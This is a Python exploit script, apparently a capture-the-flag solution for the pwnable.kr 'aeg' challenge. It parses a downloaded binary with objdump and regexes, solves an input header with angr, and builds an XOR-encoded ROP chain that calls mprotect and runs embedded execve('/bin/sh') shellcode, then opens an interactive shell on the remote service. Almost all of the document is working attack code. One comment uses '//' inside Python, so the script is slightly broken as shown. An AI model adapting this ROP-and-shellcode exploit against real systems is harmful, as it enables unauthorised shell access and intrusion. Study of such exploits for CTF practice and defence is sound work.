from pwn import *
from base64 import b64decode
import angr
import claripy
import re

def parse():
    global start_addr, memcpy_addr, byte_odd, byte_even, stack_buffer_len, rdata_addr, decoded_payload_addr, populate_registers, populate_registers_rbp_offset

    print(f"[*] Parsing {fname}...")

    memcpy_addr = elf.symbols['memcpy']
   
    # start address, decoded payload address
    x = subprocess.run("objdump -d aeg -M intel",shell=True, capture_output=True)
    dump = x.stdout.decode()
    put_rex = '<puts@plt>\n' 
    hex_rex = '([0-9a-f]*)'
    rex = put_rex + '.{0,1024}?' + put_rex 
    match = re.search(rex, dump , flags = re.DOTALL).group(0)
    start_addr = int(re.search(hex_rex + ':', match).group(1), 16)

    x = subprocess.run("objdump -d aeg -M intel | grep -B 8 'call.*memcpy' | sed -n '6p' | awk '{print $12}'",shell=True, capture_output=True)
    decoded_payload_addr = int(x.stdout.decode(),16) - 0x30

    # populate_registers
    """
    248a30:       4c 89 4d c0             mov    QWORD PTR [rbp-0x40],r9
    2248a34:       b8 00 00 00 00          mov    eax,0x0
    2248a39:       5d                      pop    rbp
    2248a3a:       c3                      ret
    2248a3b:       f3 0f 1e fa             endbr64
    2248a3f:       55                      push   rbp
    2248a40:       48 89 e5                mov    rbp,rsp
    2248a43:       48 83 ec 50             sub    rsp,0x50
    2248a47:       48 89 7d d8             mov    QWORD PTR [rbp-0x28],rdi
    2248a4b:       48 89 75 d0             mov    QWORD PTR [rbp-0x30],rsi
    2248a4f:       48 89 55 c8             mov    QWORD PTR [rbp-0x38],rdx
    2248a53:       48 89 4d c0             mov    QWORD PTR [rbp-0x40],rcx
    2248a57:       4c 89 45 b8             mov    QWORD PTR [rbp-0x48],r8
    2248a5b:       4c 89 4d b0             mov    QWORD PTR [rbp-0x50],r9
    """
    match = re.findall(hex_rex + ":.{0,30}?" + r"mov\s*QWORD PTR \[rbp-0x" + hex_rex + ".{0,10}?r9", dump) 
    populate_registers = int(match[1][0], 16) + 0x10
    populate_registers_rbp_offset = int(match[1][1], 16) - 0x28
    
    # xor bytes used
    x = subprocess.run("objdump -d aeg -M intel | grep '83 f0' | awk '{print $4}'",shell=True, capture_output=True)
    xl = x.stdout.splitlines()
    byte_even = int(xl[0],16)
    byte_odd = int(xl[1],16)

    # stack buffer size used by memcpy
    x = subprocess.run("objdump -d aeg -M intel | grep -B 8 'call.*memcpy' | head -n 1 | awk -F, '{print $2}'",shell=True, capture_output=True)
    stack_buffer_len = int(x.stdout.strip()[2:],16)

    # .rdata address
    x = subprocess.run("readelf -a aeg | grep data | head -n 1 | awk '{print $4}'",shell=True,capture_output=True)
    rdata_addr = int(x.stdout.strip(),16)

    print("\nData:")
    print(f"start_addr           = {hex(start_addr)}")
    print(f"memcpy_addr          = {hex(memcpy_addr)}")
    print(f"byte_odd             = {hex(byte_odd)}")
    print(f"byte_even            = {hex(byte_even)}")
    print(f"stack_buffer_len     = {hex(stack_buffer_len)}")
    print(f"rdata_addr           = {hex(rdata_addr)}")
    print(f"decoded_payload_addr = {hex(decoded_payload_addr)}")
    print(f"populate_registers   = {hex(populate_registers)}")
    print(f"rbp_offset (lowest)  = {hex(populate_registers_rbp_offset)}\n")
    print(f"[+] File parsed successfully")

def angr_solve(fname,start,win):
    global decoded_header
    p = angr.Project(fname,auto_load_libs=False)

    input = claripy.BVS("input",8*48)

    state = p.factory.blank_state(addr=start)
    state.memory.store(decoded_payload_addr, input)     # decoded payload in .data
    state.options.add(angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY)
    state.options.add(angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS)
    
    print("[*] Solving with angr...")

    simgr = p.factory.simulation_manager(state)
    simgr.explore(find=win)

    if simgr.found:
        found = simgr.found[0]
        solution = found.solver.eval(input, cast_to=bytes)
        print("[+] angr found the decoded payload")
        decoded_header = solution
    else:
        print("[!] angr failed founding the correct 48 bytes payload")
        exit(1)

def xor_payload(payload):
    data = bytearray(payload)
    for i, byte in enumerate(payload):
        if i & 1 == 0:
            data[i] = byte ^ byte_even
        else:
            data[i] = byte ^ byte_odd
    return bytes(data)

def pwn():
    // https://shell-storm.org/shellcode/files/shellcode-909.html
    shellcode = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05"

    dynamic_offset = 0x30 + stack_buffer_len + 0x20 + populate_registers_rbp_offset
    ropchain = p64(decoded_payload_addr + dynamic_offset)
    ropchain += p64(populate_registers)
    ropchain += p64(0x10000)         # rsi 
    ropchain += p64(4|2|1)           # rdx
    ropchain += p64(rdata_addr)      # rdi
    ropchain += cyclic(populate_registers_rbp_offset)
    # rbp - 0x4
    ropchain += p64(elf.symbols['mprotect'])
    ropchain += p64(decoded_payload_addr + dynamic_offset + 0x18)        # shellcode address
    ropchain += shellcode           

    payload = decoded_header
    payload += cyclic(stack_buffer_len) # + b"B" * 8
    payload += ropchain
    payload = xor_payload(payload)
    payload = payload.hex().encode()
    print(payload)

    return payload

def build():
    open(f"{fname}.Z","wb").write(b64decode(b64))
    subprocess.call(f"gunzip -f {fname}.Z",shell=True)
    subprocess.call(f"chmod u+x {fname}",shell=True)

# ===================================================
start_addr = 0
memcpy_addr = 0
stack_buffer_len = 0
decoded_header = b""
byte_even = 0
byte_odd = 0
rdata_addr = 0
decoded_payload_addr = 0
populate_registers = 0
populate_registers_rbp_offset = 0

fname = "aeg"
elf = ELF(fname)
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    io = remote("pwnable.kr", 9005)
    b64 = io.recvuntil(b"hurry up!").split(b"\n")[8]

    parse()
    angr_solve(fname,start_addr,memcpy_addr)
    payload = pwn()

    print("[*] Sending payload...")
    io.sendline(payload)
    io.interactive()
else:
    b64=open("aeg.b64","rb").read()

    parse()
    angr_solve(fname,start_addr,memcpy_addr)
    payload = pwn()
    
    print("[*] Sending payload...")
    io = process(["./aeg",payload.decode()])
    io.interactive()